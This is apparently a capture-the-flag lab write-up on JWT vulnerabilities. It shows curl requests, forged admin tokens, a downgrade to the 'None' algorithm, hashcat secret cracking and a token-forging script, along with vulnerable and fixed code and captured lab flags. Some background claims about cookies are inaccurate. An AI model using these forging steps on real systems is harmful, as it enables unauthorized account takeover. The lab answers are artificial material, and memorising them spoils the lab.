# JWT Security

# Token-based Session Management
- **Web applications** use cookie-based session management:
    - After authentication, the server includes the cookies in the request body that's sent back to client
    - The cookie is saved in the browser's LocalStorage
    - Every time the browser makes a new request, there will be a JavaScript code to retrieve the cookies and include it in the header.
    - Browsers have built-in features to implement security for these cookies sessions
    - JWT (JSON Web Token): is one of the most common tokens used nowadays, which can be passed through the header `Authorization: Bearer '$TOKEN`
 
### ANSWER THE QUESTIONS
**- What is the common header used to transport the JWT in a request?**

-> `Authorization: Bearer`

# JSON Web Tokens
- There are three parts in a JWT, each of which is base64 encoded and separated by a dot: **Header**, **Payload**, **Signature**
    - **Header**: indicate the type of token and the signin algorithm.
    - **Payload**: includes claims (a claim = a piece of information about a specific entry). Hence, sometimes these JWT include sensitive information.
    - **Signature**: provide a method for verifying the token's authenticity. This can be None (no algorithm is used, Symmetric (using 1 secret key for both client and server like HS256), Assymetric (using public-private key pairs like RS256)
- JWE =  Encrypted JWT

### ANSWER THE QUESTIONS
- **HS256 is an example of what type of signing algorithm?**

-> `symmetric`

- **RS256 is an example of what type of signing algorithm?**

-> `assymmetric` 

- **What is the name used for encrypted JWTs?**

-> `JWE` 

# Resources
- In the follow example, there will be two useful resources I recommend using as they help us understand the vulnerabilities and how to mitigate them.
- https://jwt.io/ - This helps us quickyly decode the JWT and see their values
- Python's pyjwt - A Python module that is used to create JWT. We will be looking at some vulnerable codes as well as how to fix them

## JWT Vulnerabilities
## Sensitive Information Disclosure
- IN cookied-based sessions, server store the values of the tokens. Hence, these information are not publicly exposed on the client-side.
- JWT, since processed on the client-side, if not carefully implemented, may expose sensitive information like users' credentials, privileges, network configurations,etc.

**Demonstration**

```bash
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.53.116/api/v1.0/example1
```

![image](https://github.com/user-attachments/assets/aa82e694-6951-4e5e-b036-79e8579bd0f8)

- Copy the token values into [JWT.io](https://jwt.io/), we see its content, which exposes some senitive information:

  ![image](https://github.com/user-attachments/assets/fa8a621f-55f2-47cf-b3be-6638fdbbfa35)

**Vulnerable Code**
- This is how the vulnerable code looks like

```bash
payload = {
    "username" : username,
    "password" : password,
    "admin" : 0,
    "flag" : "[redacted]"
}

access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```

**The Fix**
- Sensitive information should not be added as claims of the JWT. Instead, they should be securely stored in the server-side. When needed, they can be read and looked up from the server

```bash
payload = jwt.decode(token, self.secret, algorithms="HS256")

username = payload['username']
flag = self.db_lookup(username, "flag")
```
### ANSWER THE QUESTIONS
- **What is the flag for example 1?**

-> `THM{9cc039cc-d85f-45d1-ac3b-818c8383a560}`

## Signature Validation Mistakes
### No Signature validation
- If the server does not verify the JWT, attackers can easily modify those JWT.

**Demonstration**
- Retrieve the token
```bash
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.10.53.116/api/v1.0/example2
```
![image](https://github.com/user-attachments/assets/6499a839-2876-48e0-8b50-6fb0436641c6)

- Verify the user
```bash
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.10.53.116/api/v1.0/example2?username=user
```
- NOtice that if we omit the last part of the token, i.e **`UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4`**, we can still verify the user.

  ![image](https://github.com/user-attachments/assets/1fad3216-7b39-49b1-b288-34153220016c)

- From the above screenshot, we saw that the first command verifies the username with the full token. The second command omits the last part and still gets the same result. Now we can confirm that this JWT does not validate signature.

**Vulnerable Code**
```bash
payload = jwt.decode(token, opptions={'verify_signature': False})
```

**The Fix**
The JWT should always be verified before performing any other actions.
```bash
payload = jwt.decode(token, self.secret, algorithms = "HS256")
```

### ANSWER THE QUESTIONS
- **What is the flag for example 2?**
Paste the user's token to [JWT.io](https://jwt.io/), we see the user is not an admin.

![image](https://github.com/user-attachments/assets/1e9ed228-1352-4f22-9cac-b1fda8983453)

Since the JWT does not validate signature, we can just change the claim to **`{ "username" : "admin", "admin" : 1 }`**. Notice the token on the left handside changes. Copy that new token value and use it to verify the user again.

![image](https://github.com/user-attachments/assets/910455df-34d5-470b-9239-5f45ee7335a3)

-> `THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}`

### Downgrade to None
In server-to-server communications, since JWT is verified in the front-end, the second server woudl not need to verify the signature. If the developers do not lock in the signature algorithm used (or deny the **None** algorithm), attackers can change the algorithm to **None** by modifying the JWT

**Demonstration**
- Retreive the user's token and verify the user
  
![image](https://github.com/user-attachments/assets/c18da188-27e3-43b7-b191-ce53732190fe)

- At this point, we know the first part of the JWT, when decoded will look like this.
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```
- Change the `alg` value to `None` and use [CyberChef](https://gchq.github.io/CyberChef/) to encode the whole thing again. We will get a new encoded header.

![image](https://github.com/user-attachments/assets/6f26d1a6-a252-4474-8e28-a0bc210689c2)

Replace the old header with this new one (omit the `=` sign). Try to verify the user again using this modified JWT. we should get the same result

![image](https://github.com/user-attachments/assets/c99df705-0df8-4782-b842-56b64163c268)

**Vulnerable Code**
In this case, the developers want to include several algorithms for the signature. They implement the code to read the header of the JWT and parse found `alg` into the signature verification, without denying the **None** algorithm

```bash
header = jwt.get_unverified_header(token)
signature_algorithm = header['alg']
payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
```

**The Fix**
- When multiple algorithms are supported, they should be included in an array in the decode function.
```bash
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")
```
### ANSWER THE QUESTIONS
- **What is the flag for example 3?**
  Now that we have modifed the header of the JWT, we can continue to modify the claim of the JWT, chaning it to the admin's values and verify the admin user
  
  ![image](https://github.com/user-attachments/assets/f81d14f2-7054-4dda-bd5f-08be40e4d33d)

- Use the modified JWT to retreieve the values of admin user
```bash
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8' http://10.10.169.12/api/v1.0/example3?username=admin
```
![image](https://github.com/user-attachments/assets/fa017e85-8d31-44ed-b47d-2b6ec402f47a)
 
-> `THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}`

### Weak Symmetric Secrets
Sometimes, the secret used for the signature is not strong enough, which can lead to attackers' cracking them. Once getting a hold of the secret, attackers can alter the claims of the JWT and exploit.
**Steps to exploit**
1. Retrieve a user's JWT and save it in a file jwt.txt
2. Download a common JWT secret list from **https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list to download such a list**
3. Use Hashcat to crack the secret: `hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list`

**The Fix**
Use sofftware to generate long, complex values that can make a secret values strong and hard to crack.

### ANSWER THE QUESTIONS
- **What is the flag for example 4?**

Follow the **Steps to exploit** above, we find the secret is **`secret`**

![image](https://github.com/user-attachments/assets/86bfb14c-40cb-4ea7-93af-c05c23a48d58)

Write a small Python code using jwt to create a new token based on the cracked secret

```python
import jwt

secret = 'secret'
payload = {"username":"admin", "admin":1}

token = jwt.encode(payload, secret, algorithm='HS256')
print(token.decode('utf-8'))
```

Execute it to get a new JWT. Then we use this new JWT to verify the admin user
```bash
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.R_W3WxiyPIyIaYxD-PCY8PzDxd_DQKNkIDu9_KyzLzU' http://10.10.169.12/api/v1.0/example4?username=admin
```
![image](https://github.com/user-attachments/assets/aace4308-2f39-40b7-b469-509819a5d135)

-> `THM{e1679fef-df56-41cc-85e9-af1e0e12981b}`
